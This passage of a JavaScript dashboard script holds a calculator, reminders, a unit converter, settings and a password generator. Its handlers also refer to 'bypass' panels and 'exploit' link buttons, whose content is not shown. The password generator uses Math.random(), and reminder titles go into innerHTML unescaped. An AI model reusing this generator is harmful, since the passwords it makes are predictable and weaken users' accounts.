          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = dashboard.config.accentColor; // Use accent color
          ctx.lineWidth = 4; // Increased line width
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = dashboard.config.accentColor; // Use accent color
          ctx.lineWidth = 4; // Increased line width
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          this.showNotification('Clicked: Clear Canvas.');
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.body;
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            this.showNotification('Clicked: Screenshot. Dashboard screenshot downloaded.');
          });
        });

        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          this.showNotification('Clicked: Export Notes. Notes canvas downloaded.');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          const isMainGridHidden = mainGrid.style.display === 'none';
          if (isMainGridHidden) { // If main grid is hidden (canvas is likely shown or all sections hidden)
              mainGrid.style.display = 'flex';
              updatesNotifications.style.display = 'flex';
              infoPanelsContainer.style.display = 'block'; // Make sure info panel container is shown
              canvasContainer.style.display = 'none'; // Hide canvas if it was open
              toggleBtn.innerText = '⬆️ Toggle Sections';
              this.showNotification(`Clicked: Show Sections`);
          } else { // If main grid is visible
              mainGrid.style.display = 'none';
              updatesNotifications.style.display = 'none';
              infoPanelsContainer.style.display = 'none';
              canvasContainer.style.display = 'none'; // Ensure canvas is also hidden if toggling everything off
              toggleBtn.innerText = '⬇️ Toggle Sections';
              this.showNotification(`Clicked: Hide Sections`);
          }
        });
      },

      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.classList.remove('show');
          panel.style.display = 'none'; // Ensure it's hidden after animation out
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },

      initUtilityButtons: function() {
          const utilityButtons = document.querySelectorAll('.utility-buttons-row button');
          utilityButtons.forEach(button => {
              const panelId = button.dataset.panelId; // Get panel ID from data attribute
              if (button.dataset.listenerAdded) return; // Prevent duplicate listeners

              button.addEventListener('click', () => {
                  this.togglePanel(panelId);
                  const buttonText = button.textContent.replace(/[\uD800-\uDFFF].\s*/, '').trim();
                  this.showNotification(`Clicked: ${buttonText} panel.`);
              });
              button.dataset.listenerAdded = true;
          });
          // Also for .handbook-buttons and other 'a' tags that navigate externally
          document.querySelectorAll('.handbook-buttons a, .links-list a, .exploit-buttons a').forEach(link => {
            if (link.dataset.listenerAdded) return; // Prevent duplicate listeners
            link.addEventListener('click', () => {
                this.showNotification(`Navigated to external link: ${link.textContent.trim()}`);
            });
            link.dataset.listenerAdded = true;
          });
      },

      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        // If the clicked panel is already open, close it.
        // Otherwise, close all open panels and open the clicked one.
        if (panel.classList.contains('show')) {
          panel.classList.remove('show');
          panel.addEventListener('transitionend', function handler() {
            panel.style.display = 'none';
            panel.removeEventListener('transitionend', handler);
          });
        } else {
          // Close all other panels
          document.querySelectorAll('#infoPanelsContainer .info-panel.show').forEach(openPanel => {
            openPanel.classList.remove('show');
            openPanel.addEventListener('transitionend', function handler() {
                openPanel.style.display = 'none';
                openPanel.removeEventListener('transitionend', handler);
            });
          });

          // Show the clicked panel
          panel.style.display = 'block'; // Make it visible for animation
          setTimeout(() => panel.classList.add('show'), 10); // Trigger transition
        }
      },

      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        this.showNotification(`Toggled iPad content to: ${contentId}`);
      },

      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        this.showNotification(`Toggled Bypass content to: ${contentId}`);
      },

      // Logout functionality
      logoutUser: function() {
        this.showNotification('Logging out...');
        // Optionally send a logout webhook
        // This 'loginTime' needs to be globally accessible if `dashboard` takes over session.
        // For now, using null placeholder for real session data calculation.

        localStorage.removeItem('dashboardSettings'); // Clear user preferences
        localStorage.removeItem('dashboardReminders'); // Clear reminders as well on logout
        setTimeout(() => {
          window.location.reload(); // Simple refresh to login page
        }, 1000);
      },


      // Calculator Functionality
      calculator: {
          currentInput: '0',
          previousInput: '',
          operator: undefined,
          outputDisplay: null,

          init: function() {
              this.outputDisplay = document.getElementById('calculatorOutput');
              this.updateDisplay();
          },

          clear: function() {
              this.currentInput = '0';
              this.previousInput = '';
              this.operator = undefined;
              this.updateDisplay();
              dashboard.showNotification('Calculator cleared.');
          },

          backspace: function() {
              this.currentInput = this.currentInput.toString().slice(0, -1);
              if (this.currentInput === '') this.currentInput = '0';
              this.updateDisplay();
              dashboard.showNotification('Calculator backspace.');
          },

          appendNumber: function(number) {
              if (this.currentInput.includes('.') && number === '.') return;
              if (this.currentInput === '0' && number !== '.') {
                  this.currentInput = number;
              } else {
                  this.currentInput = this.currentInput.toString() + number.toString();
              }
              this.updateDisplay();
              dashboard.showNotification(`Number ${number} added.`);
          },

          appendOperator: function(operator) {
              if (this.currentInput === '') return;
              if (this.previousInput !== '') {
                  this.compute();
              }
              this.operator = operator;
              this.previousInput = this.currentInput;
              this.currentInput = '0'; // Ready for next number
              this.updateDisplay();
              dashboard.showNotification(`Operator ${operator} selected.`);
          },

          compute: function() {
              let computation;
              const prev = parseFloat(this.previousInput);
              const current = parseFloat(this.currentInput);
              if (isNaN(prev) || isNaN(current)) {
                this.currentInput = "Error";
                this.updateDisplay();
                dashboard.showNotification('Calculator error: Invalid input.', 'error');
                return;
              };

              switch (this.operator) {
                  case '+': computation = prev + current; break;
                  case '-': computation = prev - current; break;
                  case '*': computation = prev * current; break;
                  case '/':
                      if (current === 0) {
                          this.currentInput = "Error: Div by zero";
                          dashboard.showNotification('Calculator error: Division by zero.', 'error');
                          this.updateDisplay();
                          return;
                      }
                      computation = prev / current;
                      break;
                  case '%': computation = prev % current; break;
                  default: return;
              }
              this.currentInput = computation.toString();
              this.operator = undefined;
              this.previousInput = '';
              this.updateDisplay();
              dashboard.showNotification('Calculation computed.');
          },

          updateDisplay: function() {
              // Limit display length to avoid overflow
              if (this.currentInput.length > 15) {
                this.outputDisplay.innerText = parseFloat(this.currentInput).toPrecision(10);
              } else {
                this.outputDisplay.innerText = this.currentInput;
              }
          }
      },

      // Reminder System Functionality
      reminders: {
          reminderModal: null,
          addReminderBtn: null,
          closeReminderModalBtn: null,
          saveReminderBtn: null,
          reminderTitleInput: null,
          reminderDateInput: null,
          reminderTimeInput: null,
          reminderDescriptionInput: null,
          activeRemindersList: null,
          completedRemindersList: null,
          remindersArray: [],
          reminderInterval: null, // To store the interval ID

          init: function() {
              this.reminderModal = document.getElementById('addReminderModal');
              this.addReminderBtn = document.getElementById('addReminderBtn');
              this.closeReminderModalBtn = document.getElementById('closeReminderModalBtn');
              this.saveReminderBtn = document.getElementById('saveReminderBtn');
              this.reminderTitleInput = document.getElementById('reminderTitle');
              this.reminderDateInput = document.getElementById('reminderDate');
              this.reminderTimeInput = document.getElementById('reminderTime');
              this.reminderDescriptionInput = document.getElementById('reminderDescription');
              this.activeRemindersList = document.getElementById('activeRemindersList');
              this.completedRemindersList = document.getElementById('completedRemindersList');

              this.loadReminders();
              this.displayReminders();
              this.startReminderChecker();

              this.addReminderBtn.addEventListener('click', () => {
                  this.openReminderModal();
                  dashboard.showNotification('Clicked: Add New Reminder.');
              });
              this.closeReminderModalBtn.addEventListener('click', () => this.closeReminderModal());
              this.saveReminderBtn.addEventListener('click', () => this.saveReminder());
          },

          openReminderModal: function() {
              // Clear previous inputs
              this.reminderTitleInput.value = '';
              this.reminderDateInput.value = '';
              this.reminderTimeInput.value = '';
              this.reminderDescriptionInput.value = '';

              // Set minimum date to today for date picker
              const today = new Date();
              const yyyy = today.getFullYear();
              const mm = String(today.getMonth() + 1).padStart(2, '0'); // Months start at 0!
              const dd = String(today.getDate()).padStart(2, '0');
              this.reminderDateInput.min = `${yyyy}-${mm}-${dd}`;


              this.reminderModal.style.display = 'block';
              setTimeout(() => this.reminderModal.classList.add('show'), 10);
          },

          closeReminderModal: function() {
              this.reminderModal.classList.remove('show');
              this.reminderModal.addEventListener('transitionend', function handler() {
                  this.style.display = 'none';
                  this.removeEventListener('transitionend', handler);
              }, {once: true}); // Use {once: true} to automatically remove listener
              dashboard.showNotification('Closed: Add Reminder modal.');
          },

          saveReminder: function() {
              const title = this.reminderTitleInput.value.trim();
              const date = this.reminderDateInput.value;
              const time = this.reminderTimeInput.value;
              const description = this.reminderDescriptionInput.value.trim();

              if (!title || !date || !time) {
                  alert('Please enter a title, date, and time for the reminder.');
                  return;
              }

              const reminderDateTime = new Date(`${date}T${time}:00`);
              if (isNaN(reminderDateTime.getTime()) || reminderDateTime < new Date()) {
                  alert('Please enter a valid future date and time.');
                  return;
              }

              const newReminder = {
                  id: Date.now(),
                  title,
                  description,
                  dateTime: reminderDateTime.toISOString(),
                  completed: false,
                  notified: false // To ensure notification only fires once
              };

              this.remindersArray.push(newReminder);
              this.remindersArray.sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime)); // Sort by date
              this.saveReminders();
              this.displayReminders();
              this.closeReminderModal();
              dashboard.showNotification(`Reminder "${title}" saved for ${date} at ${time}.`, 'success');
          },

          loadReminders: function() {
              try {
                  const savedReminders = JSON.parse(localStorage.getItem('dashboardReminders'));
                  if (savedReminders) {
                      this.remindersArray = savedReminders;
                      this.remindersArray.forEach(r => r.notified = r.notified || false); // Ensure notified flag exists
                      this.remindersArray.sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime));
                  }
              } catch (e) {
                  console.warn("Could not load reminders from localStorage, starting fresh.", e);
                  this.remindersArray = [];
              }
          },

          saveReminders: function() {
              localStorage.setItem('dashboardReminders', JSON.stringify(this.remindersArray));
          },

          displayReminders: function() {
              this.activeRemindersList.innerHTML = '';
              this.completedRemindersList.innerHTML = '';

              let hasActive = false;
              let hasCompleted = false;
              const now = new Date();

              this.remindersArray.forEach(reminder => {
                  const listItem = document.createElement('li');
                  const reminderDateTime = new Date(reminder.dateTime);
                  const isOverdue = reminderDateTime < now && !reminder.completed;

                  let statusClass = 'upcoming';
                  if (isOverdue) statusClass = 'overdue';
                  else if (reminder.completed) statusClass = ''; // Completed will get separate style
                  listItem.classList.add(statusClass);

                  const titleSpan = document.createElement('span');
                  titleSpan.classList.add('reminder-title-date');
                  titleSpan.innerHTML = `${reminder.title} - ${reminderDateTime.toLocaleString()}`;


                  const controlsDiv = document.createElement('div');
                  controlsDiv.classList.add('reminder-controls');


                  const deleteButton = document.createElement('button');
                  deleteButton.textContent = 'Delete';
                  deleteButton.style.backgroundColor = '#dc3545';
                  deleteButton.onclick = () => {
                      this.deleteReminder(reminder.id);
                      dashboard.showNotification(`Reminder "${reminder.title}" deleted.`);
                  };


                  if (reminder.completed) {
                      listItem.classList.add('completed');
                      titleSpan.innerHTML = `&#10003; ${titleSpan.innerHTML}`; // Checkmark
                      listItem.appendChild(titleSpan);
                      controlsDiv.appendChild(deleteButton);
                      listItem.appendChild(controlsDiv);
                      this.completedRemindersList.appendChild(listItem);
                      hasCompleted = true;
                  } else {
                      const completeButton = document.createElement('button');
                      completeButton.textContent = 'Complete';
                      completeButton.style.backgroundColor = '#28a745';
                      completeButton.onclick = () => {
                          this.markAsComplete(reminder.id);
                          dashboard.showNotification(`Reminder "${reminder.title}" marked as complete.`, 'success');
                      };
                      controlsDiv.appendChild(completeButton);
                      controlsDiv.appendChild(deleteButton);


                      listItem.appendChild(titleSpan);
                      if (reminder.description) {
                          const descElem = document.createElement('p');
                          descElem.classList.add('reminder-description');
                          descElem.textContent = reminder.description;
                          listItem.appendChild(descElem);
                      }
                      listItem.appendChild(controlsDiv);
                      this.activeRemindersList.appendChild(listItem);
                      hasActive = true;
                  }
              });

              if (!hasActive) {
                  this.activeRemindersList.innerHTML = '<li class="info-text">No active reminders.</li>';
              }
              if (!hasCompleted) {
                  this.completedRemindersList.innerHTML = '<li class="info-text" style="opacity: 0.7;">No completed reminders.</li>';
              }
          },

          markAsComplete: function(id) {
              const reminderIndex = this.remindersArray.findIndex(r => r.id === id);
              if (reminderIndex > -1) {
                  this.remindersArray[reminderIndex].completed = true;
                  this.remindersArray[reminderIndex].notified = true; // No need to notify if manually completed
                  this.saveReminders();
                  this.displayReminders();
              }
          },

          deleteReminder: function(id) {
              this.remindersArray = this.remindersArray.filter(r => r.id !== id);
              this.saveReminders();
              this.displayReminders();
          },

          startReminderChecker: function() {
              // Clear any existing interval to prevent duplicates
              if (this.reminderInterval) {
                  clearInterval(this.reminderInterval);
              }

              this.reminderInterval = setInterval(() => {
                  const now = new Date();
                  let changed = false;
                  this.remindersArray.forEach(reminder => {
                      if (!reminder.completed && !reminder.notified) { // Only check for non-completed, non-notified reminders
                          const reminderDateTime = new Date(reminder.dateTime);
                          // Notify if past or due now, but only once
                          if (now >= reminderDateTime && (now.getTime() - reminderDateTime.getTime() < 60000 * 5) ) { // Notify if due within last 5 minutes
                              dashboard.showNotification(`⏰ Reminder Alert! "${reminder.title}" is due!`, 'info');
                              reminder.notified = true; // Mark as notified
                              changed = true;
                          }
                      }
                  });
                  if(changed) this.saveReminders(); // Save changes if any reminders were marked notified
                  this.displayReminders(); // Always refresh display for overdue/upcoming status visually
              }, 10000); // Check every 10 seconds
          },

          clearAllCompleted: function() {
              if (confirm('Are you sure you want to clear all completed reminders? This cannot be undone.')) {
                  this.remindersArray = this.remindersArray.filter(r => !r.completed);
                  this.saveReminders();
                  this.displayReminders();
                  dashboard.showNotification('All completed reminders cleared.', 'success');
              }
          }
      },

      // Password Generator Functionality
      passwordGenerator: {
          resultDisplay: null,
          lengthSlider: null,
          lengthValueSpan: null,
          includeUppercaseCheckbox: null,
          includeLowercaseCheckbox: null,
          includeNumbersCheckbox: null,
          includeSymbolsCheckbox: null,
          generateBtn: null,
          copyBtn: null,
          latestPassword: '',

          init: function() {
              this.resultDisplay = document.getElementById('passwordGeneratorResult');
              this.lengthSlider = document.getElementById('passwordLength');
              this.lengthValueSpan = document.getElementById('passwordLengthValue');
              this.includeUppercaseCheckbox = document.getElementById('includeUppercase');
              this.includeLowercaseCheckbox = document.getElementById('includeLowercase');
              this.includeNumbersCheckbox = document.getElementById('includeNumbers');
              this.includeSymbolsCheckbox = document.getElementById('includeSymbols');
              this.generateBtn = document.getElementById('generatePasswordBtn');
              this.copyBtn = document.getElementById('copyPasswordBtn');

              this.lengthSlider.addEventListener('input', () => {
                  this.lengthValueSpan.textContent = this.lengthSlider.value;
              });
              this.generateBtn.addEventListener('click', () => this.generatePassword());
              this.copyBtn.addEventListener('click', () => this.copyPassword());

              // Initial generation on load
              this.generatePassword();
          },

          generatePassword: function() {
              const length = parseInt(this.lengthSlider.value);
              const includeUppercase = this.includeUppercaseCheckbox.checked;
              const includeLowercase = this.includeLowercaseCheckbox.checked;
              const includeNumbers = this.includeNumbersCheckbox.checked;
              const includeSymbols = this.includeSymbolsCheckbox.checked;

              const uppercaseChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
              const lowercaseChars = 'abcdefghijklmnopqrstuvwxyz';
              const numberChars = '0123456789';
              const symbolChars = '!@#$%^&*()_+~`|}{[]:;?><,./-=';

              let allowedChars = '';
              if (includeUppercase) allowedChars += uppercaseChars;
              if (includeLowercase) allowedChars += lowercaseChars;
              if (includeNumbers) allowedChars += numberChars;
              if (includeSymbols) allowedChars += symbolChars;

              if (allowedChars.length === 0) {
                  this.resultDisplay.textContent = 'Select at least one character type.';
                  dashboard.showNotification('Password generation failed: Select at least one character type.', 'warning');
                  return;
              }

              let generatedPassword = '';
              for (let i = 0; i < length; i++) {
                  const randomIndex = Math.floor(Math.random() * allowedChars.length);
                  generatedPassword += allowedChars[randomIndex];
              }
              this.latestPassword = generatedPassword;
              this.resultDisplay.textContent = generatedPassword;
              dashboard.showNotification('Password generated.', 'success');
          },

          copyPassword: function() {
              if (this.latestPassword) {
                  navigator.clipboard.writeText(this.latestPassword).then(() => {
                      dashboard.showNotification('Password copied to clipboard!', 'success');
                  }).catch(err => {
                      console.error('Failed to copy password: ', err);
                      dashboard.showNotification('Failed to copy password.', 'error');
                  });
              } else {
                dashboard.showNotification('No password to copy.', 'warning');
              }
          }
      },

      // Unit Converter Functionality
      unitConverter: {
          conversionTypeSelect: null,
          fromValueInput: null,
          fromUnitSelect: null,
          toUnitSelect: null,
          conversionResultDiv: null,
          convertButton: null,

          units: {
              length: {
                  meter: { to: { centimeter: 100, kilometer: 0.001, foot: 3.28084, inch: 39.3701, mile: 0.000621371 }, name: 'Meter', symbol: 'm' },
                  centimeter: { to: { meter: 0.01, kilometer: 0.00001, foot: 0.0328084, inch: 0.393701, mile: 0.00000621371 }, name: 'Centimeter', symbol: 'cm' },
                  kilometer: { to: { meter: 1000, centimeter: 100000, foot: 3280.84, inch: 39370.1, mile: 0.621371 }, name: 'Kilometer', symbol: 'km' },
                  foot: { to: { meter: 0.3048, centimeter: 30.48, kilometer: 0.0003048, inch: 12, mile: 0.000189394 }, name: 'Foot', symbol: 'ft' },
                  inch: { to: { meter: 0.0254, centimeter: 2.54, kilometer: 0.0000254, foot: 0.0833333, mile: 0.0000157828 }, name: 'Inch', symbol: 'in' },
                  mile: { to: { meter: 1609.34, centimeter: 160934, kilometer: 1.60934, foot: 5280, inch: 63360 }, name: 'Mile', symbol: 'mi' }
              },
              weight: {
                  gram: { to: { kilogram: 0.001, milligram: 1000, pound: 0.00220462, ounce: 0.035274 }, name: 'Gram', symbol: 'g' },
                  kilogram: { to: { gram: 1000, milligram: 1000000, pound: 2.20462, ounce: 35.274 }, name: 'Kilogram', symbol: 'kg' },
                  milligram: { to: { gram: 0.001, kilogram: 0.000001, pound: 0.00000220462, ounce: 0.000035274 }, name: 'Milligram', symbol: 'mg' },
                  pound: { to: { gram: 453.592, kilogram: 0.453592, milligram: 453592, ounce: 16 }, name: 'Pound', symbol: 'lb' },
                  ounce: { to: { gram: 28.3495, kilogram: 0.0283495, milligram: 28349.5, pound: 0.0625 }, name: 'Ounce', symbol: 'oz' }
              },
              temperature: { // Need special handling, not direct multiplication
                  celsius: { name: 'Celsius', symbol: '°C' },
                  fahrenheit: { name: 'Fahrenheit', symbol: '°F' },
                  kelvin: { name: 'Kelvin', symbol: 'K' }
              },
              volume: {
                liter: { to: { milliliter: 1000, gallon: 0.264172, quart: 1.05669, pint: 2.11338, cup: 4.22675 }, name: 'Liter', symbol: 'L' },
                milliliter: { to: { liter: 0.001, gallon: 0.000264172, quart: 0.00105669, pint: 0.00211338, cup: 0.00422675 }, name: 'Milliliter', symbol: 'mL' },
                gallon: { to: { liter: 3.78541, milliliter: 3785.41, quart: 4, pint: 8, cup: 16 }, name: 'Gallon (US)', symbol: 'gal' },
                quart: { to: { liter: 0.946353, milliliter: 946.353, gallon: 0.25, pint: 2, cup: 4 }, name: 'Quart (US)', symbol: 'qt' },
                pint: { to: { liter: 0.473176, milliliter: 473.176, gallon: 0.125, quart: 0.5, cup: 2 }, name: 'Pint (US)', symbol: 'pt' },
                cup: { to: { liter: 0.236588, milliliter: 236.588, gallon: 0.0625, quart: 0.25, pint: 0.5 }, name: 'Cup (US)', symbol: 'cup' }
              },
              area: {
                squareMeter: { to: { squareKilometer: 0.000001, squareFoot: 10.7639, squareInch: 1550, acre: 0.000247105 }, name: 'Sq Meter', symbol: 'm²' },
                squareKilometer: { to: { squareMeter: 1000000, squareFoot: 10763910, squareInch: 1550000000, acre: 247.105 }, name: 'Sq Kilometer', symbol: 'km²' },
                squareFoot: { to: { squareMeter: 0.092903, squareKilometer: 0.000000092903, squareInch: 144, acre: 0.0000229568 }, name: 'Sq Foot', symbol: 'ft²' },
                squareInch: { to: { squareMeter: 0.00064516, squareKilometer: 6.4516e-10, squareFoot: 0.00694444, acre: 1.5942e-7 }, name: 'Sq Inch', symbol: 'in²' },
                acre: { to: { squareMeter: 4046.86, squareKilometer: 0.00404686, squareFoot: 43560, squareInch: 6272640 }, name: 'Acre', symbol: 'ac' }
              },
              speed: {
                meterPerSecond: { to: { kilometerPerHour: 3.6, milesPerHour: 2.23694, feetPerSecond: 3.28084, knot: 1.94384 }, name: 'm/s', symbol: 'm/s' },
                kilometerPerHour: { to: { meterPerSecond: 0.277778, milesPerHour: 0.621371, feetPerSecond: 0.911344, knot: 0.539957 }, name: 'km/h', symbol: 'km/h' },
                milesPerHour: { to: { meterPerSecond: 0.44704, kilometerPerHour: 1.60934, feetPerSecond: 1.46667, knot: 0.868976 }, name: 'mph', symbol: 'mph' },
                feetPerSecond: { to: { meterPerSecond: 0.3048, kilometerPerHour: 1.09728, milesPerHour: 0.681818, knot: 0.592484 }, name: 'ft/s', symbol: 'ft/s' },
                knot: { to: { meterPerSecond: 0.514444, kilometerPerHour: 1.852, milesPerHour: 1.15078, feetPerSecond: 1.68781 }, name: 'Knot', symbol: 'kn' }
              }
          },

          init: function() {
              this.conversionTypeSelect = document.getElementById('conversionType');
              this.fromValueInput = document.getElementById('fromValue');
              this.fromUnitSelect = document.getElementById('fromUnit');
              this.toUnitSelect = document.getElementById('toUnit');
              this.conversionResultDiv = document.getElementById('conversionResult');
              this.convertButton = document.getElementById('convertUnitBtn');

              this.conversionTypeSelect.addEventListener('change', () => { this.populateUnits(); this.performConversion(); });
              this.convertButton.addEventListener('click', () => this.performConversion());
              this.fromValueInput.addEventListener('input', () => this.performConversion());
              this.fromUnitSelect.addEventListener('change', () => this.performConversion());
              this.toUnitSelect.addEventListener('change', () => this.performConversion());


              this.populateUnits(); // Initial population
              this.performConversion(); // Initial conversion
          },

          populateUnits: function() {
              const selectedType = this.conversionTypeSelect.value;
              const unitMap = this.units[selectedType];

              this.fromUnitSelect.innerHTML = '';
              this.toUnitSelect.innerHTML = '';

              for (const unitKey in unitMap) {
                  const optionFrom = document.createElement('option');
                  optionFrom.value = unitKey;
                  optionFrom.textContent = unitMap[unitKey].name;
                  this.fromUnitSelect.appendChild(optionFrom);

                  const optionTo = document.createElement('option');
                  optionTo.value = unitKey;
                  optionTo.textContent = unitMap[unitKey].name;
                  this.toUnitSelect.appendChild(optionTo);
              }
              // Set initial selected values, ensure there are at least two options for selection.
              this.fromUnitSelect.value = Object.keys(unitMap)[0] || '';
              this.toUnitSelect.value = Object.keys(unitMap)[1] || Object.keys(unitMap)[0] || '';
              dashboard.showNotification(`Unit converter type set to ${selectedType}.`);
          },

          // Temperature conversion functions
          celsiusToFahrenheit: tempC => (tempC * 9/5) + 32,
          celsiusToKelvin: tempC => tempC + 273.15,
          fahrenheitToCelsius: tempF => (tempF - 32) * 5/9,
          fahrenheitToKelvin: tempF => ((tempF - 32) * 5/9) + 273.15,
          kelvinToCelsius: tempK => tempK - 273.15,
          kelvinToFahrenheit: tempK => ((tempK - 273.15) * 9/5) + 32,


          performConversion: function() {
              const selectedType = this.conversionTypeSelect.value;
              const fromValue = parseFloat(this.fromValueInput.value);
              const fromUnitKey = this.fromUnitSelect.value;
              const toUnitKey = this.toUnitSelect.value;

              if (isNaN(fromValue)) {
                  this.conversionResultDiv.textContent = 'Enter a valid number.';
                  return;
              }
              if (!fromUnitKey || !toUnitKey) {
                this.conversionResultDiv.textContent = 'Select valid units.';
                return;
              }
              if (fromUnitKey === toUnitKey) {
                  this.conversionResultDiv.textContent = `${fromValue} ${this.units[selectedType][fromUnitKey].symbol} = ${fromValue} ${this.units[selectedType][toUnitKey].symbol}`;
                  return;
              }

              let result;
              if (selectedType === 'temperature') {
                  // Convert to Celsius first
                  let tempInBase = fromValue;
                  if (fromUnitKey === 'fahrenheit') tempInBase = this.fahrenheitToCelsius(fromValue);
                  else if (fromUnitKey === 'kelvin') tempInBase = this.kelvinToCelsius(fromValue);

                  // Then convert from Celsius to target
                  if (toUnitKey === 'celsius') result = tempInBase;
                  else if (toUnitKey === 'fahrenheit') result = this.celsiusToFahrenheit(tempInBase);
                  else if (toUnitKey === 'kelvin') result = this.celsiusToKelvin(tempInBase);
                  else { this.conversionResultDiv.textContent = 'Error: Invalid temp unit.'; return; }

              } else { // Standard multiplicative conversions
                  const unitData = this.units[selectedType][fromUnitKey];
                  if (!unitData || !unitData.to[toUnitKey]) {
                      this.conversionResultDiv.textContent = 'Conversion not supported.';
                      return;
                  }
                  result = fromValue * unitData.to[toUnitKey];
              }

              this.conversionResultDiv.textContent = `${fromValue} ${this.units[selectedType][fromUnitKey].symbol} = ${result.toFixed(4)} ${this.units[selectedType][toUnitKey].symbol}`;
              dashboard.showNotification('Unit conversion performed.');
          }
      },


      // Settings Panel Functionality
      settings: {
          init: function() {
              document.getElementById('settingsUsername').textContent = document.getElementById('loggedInUser').textContent;
              document.getElementById('settingsUserID').textContent = document.getElementById('loggedInID').textContent;

              // Attach listeners for settings changes
              document.getElementById('themeSelector').addEventListener('change', (e) => this.updateTheme(e.target.value));
              document.getElementById('accentColorPicker').addEventListener('input', (e) => this.setAccentColor(e.target.value)); // Use input for live update
              document.getElementById('fontSizeSlider').addEventListener('input', (e) => this.updateFontSize(e.target.value));
              document.getElementById('languageSelect').addEventListener('change', (e) => this.mockLanguageChange(e.target.value));
              document.getElementById('animationSpeedSelect').addEventListener('change', (e) => this.mockAnimationSpeedChange(e.target.value));

              document.getElementById('enablePanelNotifications').addEventListener('change', (e) => this.toggleNotificationSetting('enablePanelNotifications', e.target.checked));
              document.getElementById('enableReminderNotifications').addEventListener('change', (e) => this.toggleNotificationSetting('enableReminderNotifications', e.target.checked));
              document.getElementById('enableUpdateNotifications').addEventListener('change', (e) => this.toggleNotificationSetting('enableUpdateNotifications', e.target.checked));
              document.getElementById('notificationSoundToggle').addEventListener('change', (e) => this.toggleNotificationSetting('notificationSoundEnabled', e.target.checked));

              document.getElementById('reminderSoundSelect').addEventListener('change', (e) => this.updateReminderSound(e.target.value));
              document.getElementById('autoDismissReminders').addEventListener('change', (e) => this.toggleNotificationSetting('autoDismissReminders', e.target.checked));

              document.getElementById('twoFactorAuth').addEventListener('change', (e) => this.mock2FAToggle(e.target.checked));
              document.getElementById('devModeToggle').addEventListener('change', (e) => this.mockDevModeToggle(e.target.checked));
              document.getElementById('sessionTimeoutSelect').addEventListener('change', (e) => this.mockSessionTimeoutChange(e.target.value));

              // Initial settings sync
              this.syncSettingsUI();
          },

          syncSettingsUI: function() {
            document.getElementById('themeSelector').value = dashboard.config.theme;
            document.getElementById('accentColorPicker').value = dashboard.config.accentColor;
            document.getElementById('fontSizeSlider').value = parseInt(dashboard.config.fontSize);
            document.getElementById('fontSizeValue').textContent = dashboard.config.fontSize;
            document.getElementById('languageSelect').value = "en"; // Mock default
            document.getElementById('animationSpeedSelect').value = dashboard.config.animationSpeed;

            document.getElementById('enablePanelNotifications').checked = dashboard.config.enablePanelNotifications;
            document.getElementById('enableReminderNotifications').checked = dashboard.config.enableReminderNotifications;
            document.getElementById('enableUpdateNotifications').checked = dashboard.config.enableUpdateNotifications;
            document.getElementById('notificationSoundToggle').checked = dashboard.config.notificationSoundEnabled;
            document.getElementById('autoDismissReminders').checked = dashboard.config.autoDismissReminders;
            document.getElementById('reminderSoundSelect').value = dashboard.config.reminderSound;

            document.getElementById('twoFactorAuth').checked = false; // Mock default
            document.getElementById('devModeToggle').checked = false; // Mock default
            document.getElementById('sessionTimeoutSelect').value = "0"; // Mock default
          },

          updateTheme: function(theme) {
            dashboard.config.theme = theme;
            document.body.className = `dashboard-body ${theme}-theme`;
            document.getElementById('themeToggle').innerText = theme === 'dark' ? '🌙 Dark Mode' : '☀️ Light Mode';
            dashboard.showNotification(`Theme set to ${theme === 'dark' ? 'Dark' : 'Light'} mode.`);
            dashboard.saveSettings();
          },

          setAccentColor: function(color) {
              if(!color) { // If called by button click, get value from picker
                color = document.getElementById('accentColorPicker').value;
              }
              dashboard.config.accentColor = color;
              // Dynamically update CSS variables for both themes if they derive from this.
              document.documentElement.style.setProperty('--dark-accent-color', color);
              document.documentElement.style.setProperty('--light-accent-color', color); // Assuming light theme uses the same base accent
              dashboard.showNotification(`Accent color updated to ${color}.`);
              dashboard.saveSettings();
          },

          updateFontSize: function(size) {
            dashboard.config.fontSize = `${size}px`;
            document.getElementById('fontSizeValue').textContent = `${size}px`;
            document.documentElement.style.setProperty('--base-font-size', `${size}px`); // Update CSS variable
            dashboard.showNotification(`Base font size set to ${size}px.`);
            dashboard.saveSettings();
          },

          toggleNotificationSetting: function(settingName, value) {
            dashboard.config[settingName] = value;
            const status = value ? 'enabled' : 'disabled';
            // Prettier message generation for specific settings
            let message = '';
            if (settingName === 'enablePanelNotifications') message = `Panel notifications ${status}.`;
            else if (settingName === 'enableReminderNotifications') message = `Reminder alerts ${status}.`;
